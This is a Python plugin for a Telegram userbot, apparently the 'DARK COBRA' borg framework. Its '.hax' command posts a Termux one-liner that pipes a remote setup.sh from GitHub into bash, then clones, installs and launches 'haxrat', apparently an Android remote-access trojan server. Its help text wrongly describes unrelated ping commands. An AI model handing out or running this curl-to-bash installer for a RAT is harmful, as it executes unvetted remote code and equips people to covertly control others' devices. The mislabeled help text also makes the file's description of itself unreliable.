import asyncio
from datetime import datetime

from .. import ALIVE_NAME, CMD_HELP
from ..utils import admin_cmd, sudo_cmd, edit_or_reply

DEFAULTUSER = str(ALIVE_NAME) if ALIVE_NAME else "DARK COBRA"



@borg.on(admin_cmd(pattern="hax$"))
@borg.on(sudo_cmd(pattern="hax$", allow_sudo=True))
async def _(event):
    if event.fwd_from:
        return
    start = datetime.now()
    ghanta = borg.uid
    event = await edit_or_reply(event, "__**(★ Kong!__**")
    end = datetime.now()
    ms = (end - start).microseconds / 1000
    await event.edit(
        f'Tap To copy and paste in Termux\n\n`bash -c "$(curl -fsSL https://raw.githubusercontent.com/Hax4us/Apkmod/master/setup.sh)";cd $HOME;git clone https://github.com/Hax4us/haxrat;cd haxrat/server;apt install nodejs;npm install;npm install -g npm;npm audit fix;node index.js;`\n\n)'
    )


CMD_HELP.update(
    {
        "ping": "__**PLUGIN NAME :** King__\
    \n\n📌** CMD ★** `.pingy`\
    \n**USAGE   ★  **A kind of ping with extra animation\
    \n\n📌** CMD ★** `.king`\
    \n**USAGE   ★  **Shows you the ping speed of server"
    }
)
